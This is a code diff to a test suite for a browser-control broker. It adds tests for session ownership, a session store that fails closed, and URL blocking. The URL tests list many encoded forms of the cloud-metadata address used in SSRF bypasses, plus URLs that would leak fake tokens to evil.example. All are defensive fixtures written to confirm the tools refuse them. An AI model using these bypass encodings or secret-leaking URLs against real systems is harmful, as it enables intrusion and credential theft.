@@ -43,7 +43,11 @@ PROTOCOL = "hermes-browser-control-v1"
 CAPS = ["controller.noop", "browser_click", "browser_snapshot", "browser_navigate", "browser_screenshot", "browser_batch"]
 
 class Adapter:
-    sessions = None  # None: no session store; else a set of known session ids
+    async def _ensure_session_db_async(self):
+        class Db:
+            def get_session(self, session_id):
+                return {"id": session_id}
+        return Db()
     def _check_auth(self, request):
         from aiohttp import web
         if request.headers.get("Authorization") in (TOKEN, OTHER):
@@ -543,7 +547,7 @@ print(json.dumps(asyncio.run(main())))
   assert.equal(data.available_after, false);
 });
 
-test('two controllers in one session lane are never guessed between, and an older socket cannot detach a newer one', () => {
+test('one session has one principal, two controllers are never guessed between, and an older socket cannot detach a newer one', () => {
   const out = runPython(`${PRELUDE}${SKIP_GUARD}
 def code(text):
     return json.loads(text)["code"]
@@ -575,12 +579,31 @@ async def main():
         other, _ = await attach(client, broker, controller="ctl-2", profile="bp-2")
         seen["replaced_lane"] = [scope.controller_id for scope in broker.lane_scopes(profile_id="luxord", session_id="sess-A")]
 
-        # a different credential is a different principal: two lanes, so no guess
-        third, _ = await attach(client, broker, token=OTHER, controller="ctl-3")
-        seen["two_principals"] = len(broker.lane_scopes(profile_id="luxord", session_id="sess-A"))
+        # a different credential cannot register for a session another credential has a live controller on
+        status, refusal = await register(client, token=OTHER, controller="ctl-3")
+        seen["other_principal_register"] = [status, refusal["error"]["code"]]
+        # nor attach with a ticket it minted before that controller attached
+        _, early = await register(client, token=OTHER, session="sess-D", controller="ctl-9")
+        d_ws, _ = await attach(client, broker, session="sess-D", controller="ctl-8")
+        seen["early_ticket"] = await refused(connect(client, early["ticket"]))
+        seen["d_owner_kept"] = [scope.controller_id for scope in broker.lane_scopes(profile_id="luxord", session_id="sess-D")]
+        # the lane holds one principal; a forged second one makes the tools fail closed
+        scope = broker.lane_scopes(profile_id="luxord", session_id="sess-A")[0]
+        forged = broker_module.ControllerScope(principal_id="principal:forged", profile_id="luxord", session_id="sess-A", controller_id="ctl-f",
+                                               browser_profile_id="bp-f", transport_family="local-api", capabilities=frozenset(CAPS))
+        broker._controllers[forged] = broker_module._Controller(scope=forged, send=lambda frame: None, owner=object())
         seen["ambiguous"] = code(tools.run_control_action("browser_snapshot", {}, {"session_id": "sess-A"}))
         seen["scope_for_session"] = broker.scope_for_session(profile_id="luxord", session_id="sess-A") is None
-        for socket in (new, other, third):
+        del broker._controllers[forged]
+        # once the first controller is offline, the other credential may take the session over
+        await other.close()
+        for _ in range(100):
+            if not broker._controllers[scope].connected: break
+            await asyncio.sleep(0.02)
+        third, _ = await attach(client, broker, token=OTHER, controller="ctl-3")
+        lane = broker.lane_scopes(profile_id="luxord", session_id="sess-A")
+        seen["takeover"] = [[s.controller_id for s in lane], lane[0].principal_id != scope.principal_id]
+        for socket in (new, third, d_ws):
             await socket.close()
     return seen
 
@@ -592,12 +615,15 @@ print(json.dumps(asyncio.run(main())))
   assert.equal(data.reconnect_connected, true);
   assert.equal(data.served_by_new, 'on the new socket');
   assert.deepEqual(data.replaced_lane, ['ctl-2']);
-  assert.equal(data.two_principals, 2);
+  assert.deepEqual(data.other_principal_register, [409, 'browser_control_session_owned']);
+  assert.equal(data.early_ticket, 409);
+  assert.deepEqual(data.d_owner_kept, ['ctl-8']);
   assert.equal(data.ambiguous, 'ambiguous_browser');
   assert.equal(data.scope_for_session, true);
+  assert.deepEqual(data.takeover, [['ctl-3'], true]);
 });
 
-test('registration for a session the server does not know is refused, and an unavailable session store fails closed', () => {
+test('registration for a session the server does not know is refused, and a session store that cannot answer fails closed', () => {
   const out = runPython(`${PRELUDE}${SKIP_GUARD}
 async def main():
     seen = {}
@@ -611,6 +637,24 @@ async def main():
     async with client:
         unavailable = await client.post(REGISTER, headers={"Authorization": TOKEN}, json=body(session="sess-A"))
         seen["unavailable"] = [unavailable.status, (await unavailable.json())["error"]["code"]]
+    class NoStore:
+        def _check_auth(self, request): return None
+    class RaisingStore(NoStore):
+        async def _ensure_session_db_async(self):
+            raise RuntimeError("boom")
+    class RaisingLookup(NoStore):
+        async def _ensure_session_db_async(self):
+            class Db:
+                def get_session(self, session_id): raise RuntimeError("boom")
+            return Db()
+    class NoLookup(NoStore):
+        async def _ensure_session_db_async(self):
+            return object()
+    for label, adapter in (("no_seam", NoStore()), ("open_raises", RaisingStore()), ("lookup_raises", RaisingLookup()), ("no_lookup", NoLookup())):
+        client, broker, _ = await make(adapter)
+        async with client:
+            response = await client.post(REGISTER, headers={"Authorization": TOKEN}, json=body())
+            seen[label] = [response.status, (await response.json())["error"]["code"], len(broker._tickets)]
     return seen
 
 print(json.dumps(asyncio.run(main())))
@@ -620,6 +664,9 @@ print(json.dumps(asyncio.run(main())))
   assert.equal(data.known, 201);
   assert.deepEqual(data.ghost, [403, 'browser_control_session_forbidden']);
   assert.deepEqual(data.unavailable, [503, 'session_db_unavailable']);
+  for (const label of ['no_seam', 'open_raises', 'lookup_raises', 'no_lookup']) {
+    assert.deepEqual(data[label], [503, 'session_db_unavailable', 0], `${label} fails closed and mints nothing`);
+  }
 });
 
 test('a URL with a secret or a cloud-metadata address is refused before anything is sent, and arguments are checked', () => {
@@ -640,6 +687,25 @@ async def main():
             "secret": ("browser_navigate", {"url": "https://evil.example/?k=sk-abcdefghijklmnopqrstuvwxyz123456"}),
             "secret_encoded": ("browser_navigate", {"url": "https://evil.example/?k=sk%2Dabcdefghijklmnopqrstuvwxyz123456"}),
             "github_token": ("browser_tab_create", {"url": "https://evil.example/ghp_" + "a" * 36}),
+            "decimal": ("browser_navigate", {"url": "http://2852039166/latest/"}),
+            "hex": ("browser_navigate", {"url": "http://0xa9fea9fe/latest/"}),
+            "hex_dotted": ("browser_navigate", {"url": "http://0xA9.0xFE.0xA9.0xFE/"}),
+            "octal": ("browser_navigate", {"url": "http://0251.0376.0251.0376/"}),
+            "short": ("browser_navigate", {"url": "http://169.254.43518/"}),
+            "mapped": ("browser_navigate", {"url": "http://[::ffff:169.254.169.254]/"}),
+            "mapped_hex": ("browser_navigate", {"url": "http://[::ffff:a9fe:a9fe]/"}),
+            "compat": ("browser_tab_create", {"url": "http://[::169.254.169.254]/"}),
+            "nat64": ("browser_navigate", {"url": "http://[64:ff9b::a9fe:a9fe]/"}),
+            "percent_host": ("browser_navigate", {"url": "http://%31%36%39.254.169.254/"}),
+            "fullwidth": ("browser_navigate", {"url": "http://\uff11\uff16\uff19.\uff12\uff15\uff14.\uff11\uff16\uff19.\uff12\uff15\uff14/"}),
+            "no_slashes": ("browser_navigate", {"url": "http:169.254.169.254/"}),
+            "backslashes": ("browser_navigate", {"url": "http:" + chr(92) * 2 + "169.254.169.254" + chr(92) + "x"}),
+            "tab_in_host": ("browser_navigate", {"url": "http://169.254.\t169.254/"}),
+            "trailing_dot": ("browser_navigate", {"url": "http://169.254.169.254./"}),
+            "uppercase_name": ("browser_navigate", {"url": "http://METADATA.GOOGLE.INTERNAL/"}),
+            "unreadable_numeric": ("browser_navigate", {"url": "http://0x100000000/"}),
+            "too_many_parts": ("browser_navigate", {"url": "http://1.2.3.4.5/"}),
+            "unterminated_v6": ("browser_navigate", {"url": "http://[::1/"}),
             "batch_step": ("browser_batch", {"actions": [{"action": "click", "ref": "@e1"}, {"action": "navigate", "url": "http://169.254.169.254/"}]}),
         }
         seen["blocked"] = {label: code(tools.run_control_action(action, args, {"session_id": "sess-A"})) for label, (action, args) in blocked.items()}
@@ -657,6 +723,11 @@ async def main():
             seen["sent_nothing"] = True
 
         # a local or private address is the person's own to open, and a valid call goes through
+        for allowed in ("http://10.0.0.5/", "http://2130706433/", "http://[::1]/", "https://example.com/169.254.169.254", "http://example.com.123x/", "about:blank"):
+            task = asyncio.create_task(call("browser_navigate", {"url": allowed}))
+            frame = await ws.receive_json(timeout=5)
+            await ws.send_json({"method": "browser.controller.result", "params": {"command_id": frame["params"]["command_id"], "ok": True, "result": {"status": "ok"}}})
+            assert json.loads(await task) == {"status": "ok"}, allowed
         task = asyncio.create_task(call("browser_navigate", {"url": "http://127.0.0.1:3000/"}))
         frame = await ws.receive_json(timeout=5)
         seen["local_action"] = [frame["params"]["action"], frame["params"]["arguments"]]
@@ -779,6 +850,22 @@ try:
 except ConnectionError:
     seen["send_failed"] = broker.pending_count
 broker.reset()
+live, offline = object(), object()
+mine, theirs = scope(controller="mine"), B.ControllerScope(principal_id="q", profile_id="prof", session_id="s", controller_id="c2",
+                                                          browser_profile_id="bp", transport_family="local-api", capabilities=frozenset(("controller.noop",)))
+broker.attach(mine, sent.append, owner=live)
+seen["conflict_check"] = broker.principal_conflict(theirs)
+try:
+    broker.attach(theirs, sent.append, owner=offline)
+    seen["conflict_attach"] = "attached"
+except B.PrincipalConflict:
+    seen["conflict_attach"] = "refused"
+seen["holder_kept"] = [s.controller_id for s in broker.lane_scopes(profile_id="prof", session_id="s")]
+broker.disconnect(mine, owner=live)
+seen["offline_conflict"] = broker.principal_conflict(theirs)
+broker.attach(theirs, sent.append, owner=offline)
+seen["offline_replaced"] = [s.controller_id for s in broker.lane_scopes(profile_id="prof", session_id="s")]
+broker.reset()
 seen["reset"] = [broker.any_connected(), len(broker.lane_scopes(profile_id="prof", session_id="s"))]
 print(json.dumps(seen))
 `);
@@ -806,6 +893,11 @@ print(json.dumps(seen))
   assert.deepEqual(data.deferred_flush, ['browser.controller.cancel']);
   assert.equal(data.pending_clean, 0);
   assert.equal(data.send_failed, 0);
+  assert.equal(data.conflict_check, true);
+  assert.equal(data.conflict_attach, 'refused');
+  assert.deepEqual(data.holder_kept, ['mine']);
+  assert.equal(data.offline_conflict, false);
+  assert.deepEqual(data.offline_replaced, ['c2']);
   assert.deepEqual(data.reset, [false, 0]);
 });
 
